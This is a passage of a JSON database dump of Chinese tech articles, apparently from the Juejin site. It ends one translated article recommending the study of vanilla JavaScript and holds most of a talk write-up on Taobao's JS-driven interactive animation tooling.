本身是怎样工作的。\u003c/p\u003e\n\u003cp\u003e你可以通过阅读自己喜欢的框架的源代码\u003cstrong\u003e考考自己\u003c/strong\u003e对原生 JavaScript 的认识。这样不仅能够呈现一副这些框架背后工作的画面给你，同时也能教会你许多逻辑，顺便还可以用到工作中。你会看到框架里的函数貌似在你的应用中施了很多魔法，但其实这只是一些 JavaScript 基本概念的组合。\u003c/p\u003e\n\u003ch3 id=\"-\"\u003e给我一些可以去学习的东西\u003c/h3\u003e\n\u003cp\u003e你现在可能会问“哪些是能够帮助我学习原生 JavaScript 知识的好资源？”。\u003c/p\u003e\n\u003cp\u003e现在已经有太多关于 JavaScript 及其框架的课程和书籍。但只有少数是全面地教你理解原生 JavaScript 的，大多数还是专注于某个具体的 JavaScript 技术。\u003c/p\u003e\n\u003cp\u003e但依然还是存在好资源的…\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/e84be7fab01d9ee53d3a0001f8bbb9f3\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e《\u003ca href=\"http://eloquentjavascript.net/\"\u003eJavaScript 编程精解\u003c/a\u003e》不仅会教你基本的 JavaScript，同时也会教你广泛适用的编程技巧。如果你已经是一名高级开发者，这本书会向你提供一个关于 JavaScript 和它的核心原则的新视角。\u003c/p\u003e\n\u003cp\u003e另外一个非常不错的资源是 Kyle Simpson 写的《\u003ca href=\"https://github.com/getify/You-Dont-Know-JS\"\u003e你不知道的 JavaScript\u003c/a\u003e》。Kyle 真的知道如何去施教，关于高级的 JavaScript 概念对初学者解释得很友好，并且他将它们涵盖的很深。仅仅是这几本书的标题就已经告诉你要去学习什么，“Up \u0026amp; Going”、“Scope \u0026amp; Closures”、“this \u0026amp; Object Prototypes”、“Types \u0026amp; Grammar”、“Async \u0026amp; Performance”、“ES6 \u0026amp; Beyond”。现在已经有第七册书，名字叫 \u003ca href=\"https://github.com/getify/Functional-Light-JS\"\u003eJavaScript 中的函数式编程\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e《JavaScript 编程精解》和《你不知道的 JavaScript》这两套书共同的好处就是\u003cstrong\u003e你都可以免费获得\u003c/strong\u003e（查看给出的链接）。但如果你发现它们对你很有帮助，别忘记通过购买它们以对作者表示支持。\u003c/p\u003e\n\u003cp\u003e如果你更倾向于看视频学习，你可以观看\u003ca href=\"https://frontendmasters.com/kyle-simpson/\"\u003e Kyle 的在线课\u003c/a\u003e，我觉得最好把看视频作为是看书的辅助学习，因为这些主题都是一样的。当然啦，这些课程都是免费的。\u003c/p\u003e\n\u003cp\u003e另一个我觉得有帮助的视频教程是 Anthony Alicea 的 \u003ca href=\"https://www.udemy.com/understand-javascript/\"\u003eJavascript: Understanding the Weird Parts\u003c/a\u003e。这个教程以循序渐进的方式解释了 JavaScript 背后发生的事，同时这门教程涵盖了诸如原型继承、函数式编程和作用域链的高级概念。\u003c/p\u003e\n\u003ch3 id=\"-javascript-\"\u003e马上学习原生 JavaScript 吧\u003c/h3\u003e\n\u003cp\u003e如果你之前投入过时间学习原生 JavaScript，那你肯定不会后悔。不仅仅是因为\u003cstrong\u003e原生\u003c/strong\u003e，同时也是因为这会对你日后的编程技巧有好的影响。\u003c/p\u003e\n\u003cp\u003e对我来说，最好的权衡是相对于花时间学习一门指定的框架，学习原生 JavaScript 会在未来带给你更多好处。框架只是捷径，背后其实都是 JavaScript。\u003c/p\u003e\n\u003cp\u003e当你用上某个框架，并在某个地方出现异常时你就会明白了，在这种情况下，你会被迫通过浏览源代码去调查这个 bug。我是不是提到过，虽然许多框架欠缺得体的文档，但它们却有复杂的代码？但是，小菜一碟，对吗？你肯定已经花了很多时间学习原生 JavaScript 了？还是没有？\u003c/p\u003e\n\u003cp\u003e从这篇文章中你应该记住一件事：\u003c/p\u003e\n\u003cp\u003e牢牢记住原生 JavaScript 会帮助你成为一名更好的开发者。完\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/0bd93805fc3afe984c2775e688c992e5\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e如果你喜欢这篇文章，鼓个掌吧，我会很感激你的。\u003c/p\u003e\n\u003cp\u003eTwitter 见 😊\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://twitter.com/coding_lawyer\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca href=\"https://twitter.com/coding_lawyer\"\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2017/8/29/6ffd540d4bd6f8804527c564f50cd65f\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e 是一个翻译优质互联网技术文章的社区，文章来源为 \u003ca href=\"https://juejin.im\"\u003e掘金\u003c/a\u003e 上的英文分享文章。内容覆盖 \u003ca href=\"https://github.com/xitu/gold-miner#android\"\u003eAndroid\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#ios\"\u003eiOS\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#react\"\u003eReact\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#前端\"\u003e前端\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#后端\"\u003e后端\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#产品\"\u003e产品\u003c/a\u003e、\u003ca href=\"https://github.com/xitu/gold-miner#设计\"\u003e设计\u003c/a\u003e 等领域，想要查看更多优质译文请持续关注 \u003ca href=\"https://github.com/xitu/gold-miner\"\u003e掘金翻译计划\u003c/a\u003e、\u003ca href=\"http://weibo.com/juejinfanyi\"\u003e官方微博\u003c/a\u003e、\u003ca href=\"https://zhuanlan.zhihu.com/juejinfanyi\"\u003e知乎专栏\u003c/a\u003e。\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514863211.1662","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e98e"},"id":"599e9e70f265da2476423553","author":{"$oid":"5a4b774a85b30d097483e97e"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/8/24/d4d4f64ffbaf015274c1b62d075ce493","https://user-gold-cdn.xitu.io/2017/8/24/a0185862674ec548ae98eb6e72fc45fa","https://user-gold-cdn.xitu.io/2017/8/24/fda6f52dd77a7aa5d6f3442631538e42","https://user-gold-cdn.xitu.io/2017/8/24/c928808dac9512e987f0c932b6de6317","https://user-gold-cdn.xitu.io/2017/8/24/761cf70c22622d798e40cd197de9aad6","https://user-gold-cdn.xitu.io/2017/8/24/adaa84c9682730b78942ea18b7a124d2","https://user-gold-cdn.xitu.io/2017/8/24/d758c9964e1c3a10e8c3a9e2ce43a358","https://user-gold-cdn.xitu.io/2017/8/24/06168c1a824f5d6885f13c8dca43ab35","https://user-gold-cdn.xitu.io/2017/8/24/1968525a77d4b9848111b5e8405eb653","https://user-gold-cdn.xitu.io/2017/8/24/5157bc64febb07455f1d61b1f47d05ed","https://user-gold-cdn.xitu.io/2017/8/24/9d8f0c4f65411565db6ceffd54871071","https://user-gold-cdn.xitu.io/2017/8/24/df7371d8b76d529a87dbf9541e986927","https://user-gold-cdn.xitu.io/2017/8/24/07ae28d2bff89f7df001fd2286eec150","https://user-gold-cdn.xitu.io/2017/8/24/e2a0d92a0bea83a1fdd9f6e863742bdb","https://user-gold-cdn.xitu.io/2017/8/24/863c5bf710323cfc65ae43bf5e290b62","https://user-gold-cdn.xitu.io/2017/8/24/4607b2f23277e03ca8205a9cb3c8011d","https://user-gold-cdn.xitu.io/2017/8/24/0fb53a62da9317824c32ad72c848ee16","https://user-gold-cdn.xitu.io/2017/8/24/26be4c1b36788189d88515b1f88d600c","https://user-gold-cdn.xitu.io/2017/8/24/cfc2c54b6d9765ba2b26775b0c47820a","https://user-gold-cdn.xitu.io/2017/8/24/77332b09c9219117213d1c5d2d9e2ef7","https://user-gold-cdn.xitu.io/2017/8/24/e13fa5ab36ea0b78e6362a4d600aa577"],"screenShot":null}],"title":"手淘互动动效的探索","meta":{"likeCount":0},"tag":["CSS","前端"],"comment":[],"shortContent":" 内容来源：2017年6月18日，手淘前端技术专家大漠在“2017 iWeb峰会·第六届HTML5峰会 ”进行《手淘互动动效的探索》演讲分享。IT大咖说作为独家视频合作方，经主办方和讲者审阅授权发布。阅读字数：3089 | 6分钟阅读 摘要现在的营销活动，用一张简单的图片去吸引消…","content":"\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003cp\u003e\u003cb\u003e\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/d4d4f64ffbaf015274c1b62d075ce493\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cp\u003e\u003cb\u003e内容来源：\u003c/b\u003e2017年6月18日，手淘前端技术专家大漠在“2017 iWeb峰会·第六届HTML5峰会 ”进行《手淘互动动效的探索》演讲分享。IT大咖说作为独家视频合作方，经主办方和讲者审阅授权发布。\u003c/p\u003e\u003cb\u003e阅读字数：\u003c/b\u003e3089  | 6分钟阅读\u003c/blockquote\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/a0185862674ec548ae98eb6e72fc45fa\"\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003ch2\u003e摘要\u003c/h2\u003e\u003cp\u003e现在的营销活动，用一张简单的图片去吸引消费者已经远远不够，必须要有能给消费者带来视觉冲击的东西，或者在动画过程中提供更好的引导部分。手淘的前端团队经历了从Gif、视频到CSS Animation的从0-1的过程，并致力于研究的数据化驱动的动效。大漠将为我们带来在手淘互动动效上的探索分享。\u003c/p\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cp\u003e\u003c/p\u003e\u003cdiv src=\"https://v.qq.com/iframe/player.html?vid=c0541uc3lm8\u0026amp;width=670\u0026amp;height=376.875\u0026amp;auto=0\"\u003e\u003c/div\u003e\u003cb\u003e嘉宾演讲视频地址：\u003c/b\u003e\u003ca href=\"http://t.cn/RCWCDu5\"\u003ehttp://t.cn/RCWCDu5\u003c/a\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e“互动，是连接用户的桥梁”\u003c/h2\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/fda6f52dd77a7aa5d6f3442631538e42\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e我们以前访问Web页面是没有动画和动效的，甚至点击跳转的功能都很少。那时是纯粹的文字展示，图片在网站上也很少能看见。\u003c/p\u003e\u003cp\u003e最初点击一个链接跳到一个新的页面，这是一种交互。随着技术的变革，点击一个按钮会弹出一个窗口，这也是我以前认识的一种交互。现在我们的交互行为变得更加复杂。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/c928808dac9512e987f0c932b6de6317\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e用户无需进行任何操作，页面只是告诉用户去点击某个按钮可以进入一个页面或一个会场。这种交互行为在内部我们称之为引流。\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e还有一种是纯氛围的动画交互效果。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e橱窗是加上一些动效或陀螺仪的功能，让用户觉得耳目一新。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e抽奖是加入了一些用户的交互行为，点击红包就会告诉用户中了多少钱或者运气不好没有中奖。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e视频现在也是一种传替交互的表现形式，如果加上一些其它的技术手段上去，能表现出来的就不止是我们看到的视频那样。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e我们目前尝试在手淘互动里加一些简单的游戏，这些游戏就是利用前端的代码加一些创意，把用户吸引到互动的活动里来，让用户在这里驻留的时间更久。或者通过这些小游戏给用户带来一定的收益。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e提醒是一个时间倒计时，告诉用户还有多少时间去参加“双十一”抢红包的活动。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e交互在我们团队就是以上这些表现形式。\u003c/p\u003e\u003cp\u003e最早我们只能看到PC端的Web页面，随着移动端的快速发展，移动端的互动方式也会越来越丰富。\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e“动画，用于点缀”\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/761cf70c22622d798e40cd197de9aad6\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e最早实现动画的技术方案是Gif、视频，还有早期PC端看到的Flash页面，这些方案都是前端不用参与的。\u003c/p\u003e\u003cp\u003e但是Gif图放到移动端，会产生一些不好的后果。以及iOS不支持Flash，视频也有一些存在的风险。\u003c/p\u003e\u003cp\u003e在CSS3出现以后，大家做简单动画的时候会经常用到。还有一些SVG和Canvas动画。但其实这些都还不能满足我们各种业务场景。\u003c/p\u003e\u003cp\u003e我们今天的重点会放在JS-Driven Animation动画。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e0-1的过程\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/adaa84c9682730b78942ea18b7a124d2\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e2015年，我们团队经历了一个0-1的过程。在15年之前，各种大触看到的氛围和动效基本上是Gif图或是视频。15年年货节，我们尝试了第一次的改变，通过前端CSS或JS的技术手段，把一个Gif图转换成动画效果。完成这个效果的时候，无论是需求方还是产品都很满意，因为这种方案可以随时更改动画中的元素。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003eCSS动画的痛点\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/d758c9964e1c3a10e8c3a9e2ce43a358\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e沟通成本高。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e开发成本高：因为要通过CSS去繁衍一个视频或Gif图演示的动效，除了要懂这方面的技术之外，还要让Gif图通过代码层面来实现。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e还原度低：CSS实现动画的手段是有限的，要做一些复杂的动画还是有难度。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e可控制性低：如果需求方改变了其中某一个动画需求，我们至少要花2-3天来繁衍那部分的效果。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e可交互性弱：CSS动画无法实现在播到某个时间段突然弹出窗口告知用户可以参加的活动。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003cli\u003e\u003cspan style=\"line-height: 1.6;\"\u003e日渐无法满足业务场景：在0-1的过程中，需求方可能还是比较满意的，但是如果每次的动画效果都是用这种方案来实现，需求方会觉得很无聊，做出来也无法达到100%的还原度。\u003c/span\u003e\u003cbr\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003eJS-Driven Animation\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/06168c1a824f5d6885f13c8dca43ab35\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e经过市场调研综合结果之后，我们最终还是选择自己“造轮子”。因为我们希望可以是自己控制的，不用担心被别人起诉，也不担心新功能无法在它的基础上进行扩展。\u003c/p\u003e\u003cp\u003e后来我们经过一年的时间做了一个用JS驱动动画的工具Animation Flow Tool。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/1968525a77d4b9848111b5e8405eb653\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e动画管理\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e我个人喜欢把动画的管理当作是导演一场舞台剧，要指挥每个演员何时出场，出来做什么，何时退场。在我们的动画管理中有一个timeline，它很像导演的角色。\u003c/p\u003e\u003cp\u003e通过时间轴可以很好地控制动画的场景，包括它何时播放、何时停止、何时退出。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003eCSS处理动画衔接的短板\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/5157bc64febb07455f1d61b1f47d05ed\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eCSS是通过持续时间来实现控制，如果所有时间点都已经确定了，这样做是没有问题的。\u003c/p\u003e\u003cp\u003e比如动画“火山升起”的时候发来1秒的时间，第二个动画“火焰柱喷发”是在“火山升起”结束后开始播放。这时就可知它的延迟时间是1秒，“岩浆流动”同时播放也是1秒。到了“红包喷发”的时候就需要进行计算，前面的动画播放4秒后再播放“红包喷发”，它的延迟是1.4秒。如果这时“火山升起”的持续时间有所变动，那么后续的所有时间都要重新进行计算。这是CSS管理动画最大的缺点之一。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e动画（片段）之间有重叠\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/9d8f0c4f65411565db6ceffd54871071\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e后来我们改变了一种模式，通过JS来监控第一段动画，并告诉后面的动画什么时候结束再可以开始播放。这时无论第一段动画如何改变，都不用担心后面的动画。\u003c/p\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e扩展动画\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/df7371d8b76d529a87dbf9541e986927\"\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003cp\u003eCSS在手淘上实现的动效性质都是相同的，我们把它定义为精灵动画和路径动画。经过一年我们发现这两种动画是我们业务中最常见的动画效果，于是就对它们进行了封装。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e精灵动画\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e以前要把所有图案拼成一张图，然后通过Animation控制每一帧的播放。后来我们通过API来控制。\u003c/p\u003e\u003cp\u003e比如一个图案从底部出现到顶部隐藏一共经历了80帧。按照以前CSS的动画实现方案，需要拼80张图片。在这80张小图里有40张可能是相同的，CSS却不能把相同的图片利用起来。\u003c/p\u003e\u003cp\u003e而AFT的方案是可以的，也就是说在这个基础上最起码节省了40张图片。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003eCSS路径动画\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e在没有AFT的情况下，我们做的是路径动画，通过translate来改变x和y轴的轨径位置。\u003c/p\u003e\u003cp\u003e我们当时做这个动画效果描点描了很久，但是产品经理突然提出不要Z形的路径，要改成S形，我们又只好重新描S形的路径出来。有一位同事描了七套路径，需求方还不是很满意，因为用translate来描点，不管怎么描到无法达到流畅的效果。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003eAFT路径动画\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e后来我们改用SVG的路径，无论需求方想要什么路径，只要找个SVG的制图软件导出路径节点就可以。这是我们后来对路径动画做的改变。\u003c/p\u003e\u003cp\u003e如果以后CSS的路径动画属性得到浏览器的支持，可以直接用原生的CSS路径动画，也支持SVG导出的路径，实现路径动画，AFT就要退出历史舞台了。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003eAFT骨骼动画\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e骨骼动画是借助第三方平台的工具把骨骼动画做出来，导出它的json数据，拿到json数据再出动画效果。\u003c/p\u003e\u003cdiv\u003e\u003ch2\u003eAFT架构的演变\u003c/h2\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/07ae28d2bff89f7df001fd2286eec150\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e最早的时候我们是利用IDE导出一份json数据，通过第三方JS库来实现DOM的动画效果。\u003c/p\u003e\u003cp\u003e我们的第二种方案是通过An/AE导出一份json数据，再通过前端的DSL层面来实现动画效果。\u003c/p\u003e\u003cp\u003e经过实验，这两种都不是我们想要的实现方案，后来我们对它进行了一些简单的改造。\u003c/p\u003e\u003cdiv\u003e\u003ch2\u003eaft.js架构细节\u003c/h2\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/e2a0d92a0bea83a1fdd9f6e863742bdb\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e第一部分是元素，第二部分是动效器，第三部分是引擎，最关键的一点是动画管理，也就是时间轴。\u003c/p\u003e\u003cp\u003e元素和动效是分离的，只要做动效，然后把动效赋予到元素上，再找引擎来渲染。\u003c/p\u003e\u003cp\u003e我们专注于做管理动画，怎样把动画描述出来，怎样把动画串起来构成我们所需业务的动画。这是AFT后面实现的底层架构，看上去没有以前那么复杂。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/863c5bf710323cfc65ae43bf5e290b62\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e业务开发模式\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003ch3\u003e曾经开发模式\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/4607b2f23277e03ca8205a9cb3c8011d\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e视觉设计提供一个Gif或视频文件和一个PSD文件，交付到前端。前端根据Gif或视频的动画效果，把整个动画繁衍出来。也就是AFT动画繁衍的过程。这个模式的沟通成本非常高。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e现在的业务开发模式\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/0fb53a62da9317824c32ad72c848ee16\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e前端只负责业务层的逻辑代码，视觉通过AE这种制作动画的工具去导出动画。要有业务逻辑，再通过前端加入业务逻辑。如果不要业务逻辑的话，就无需前端界入了。\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e“可量化和数据驱动”\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e粗犷的做法\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/26be4c1b36788189d88515b1f88d600c\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eAE导出的不是json数据，它做出一个视频，然后前端再通过代码繁衍。\u003c/p\u003e\u003cdiv\u003e\u003ch3\u003e正确的做法\u003c/h3\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/cfc2c54b6d9765ba2b26775b0c47820a\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e通过动画编程语言进行实现，要什么效果就能繁衍出什么效果。\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003ch2\u003e\u003cb\u003e思考探索\u003c/b\u003e\u003c/h2\u003e\u003c/div\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/24/77332b09c9219117213d1c5d2d9e2ef7\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e我们提出了一个“动画工程师”的概念。我们团队目前还在思考动画工程师应该做什么，动画工程师是不是能直接实现动画的过程就可以称之为动画工程师。但我个人认为远远不止这些，我们还在思考探索中。\u003c/p\u003e\u003cp\u003e我今天的分享就到这里，感谢聆听！\u003c/p\u003e\u003cdiv\u003e\u003cblockquote\u003e\u003cp\u003e\u003cb\u003e相关推荐\u003c/b\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cp\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;mid=2247487310\u0026amp;idx=1\u0026amp;sn=03cb2378f7563b4c3289a5ea5aea6166\u0026amp;chksm=97ebace5a09c25f3fb64a7104a307e9ae99ef642bd98668d919595abcec92a35d274670506d0\u0026amp;scene=21#wechat_redirect\"\u003eMars在移动网络的探索和实践\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;mid=2247486616\u0026amp;idx=1\u0026amp;sn=9d759f9fd8d83e2318bef089c7da2a95\u0026amp;chksm=97ebaf33a09c2625c5db5670f032cf05d91b1419bffc7b90ca59121c35693659aef1f37af4dd\u0026amp;scene=21#wechat_redirect\"\u003e阿里巴巴前端专家渚薰：H5互动的正确打开方式\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cb\u003e近期活动\u003c/b\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003cp\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;amp;mid=100004206\u0026amp;amp;idx=1\u0026amp;amp;sn=34b3a83055e48389a54517f98a6c330d\u0026amp;amp;chksm=17ebb2c5209c3bd32b6ac1785151756b6489bc99d3c19fbee3bd75e64ceea4de263d052589cd#rd\"\u003e【未读】一封来自未来的信\u003c/a\u003e\u003cbr\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003e\u003ca href=\"http://mp.weixin.qq.com/s?__biz=MzIxODQxMjc0MA==\u0026amp;mid=2247487925\u0026amp;idx=2\u0026amp;sn=0eca5ea31374935efe64ffecde9e17bf\u0026amp;chksm=97ebb21ea09c3b08134da3aac5cb1112008431cf979c034885f338034544afd874efc780022b\u0026amp;scene=21#wechat_redirect\"\u003e直播 | 走进华为之如何构建一款好的APP\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp\u003e\u003ca 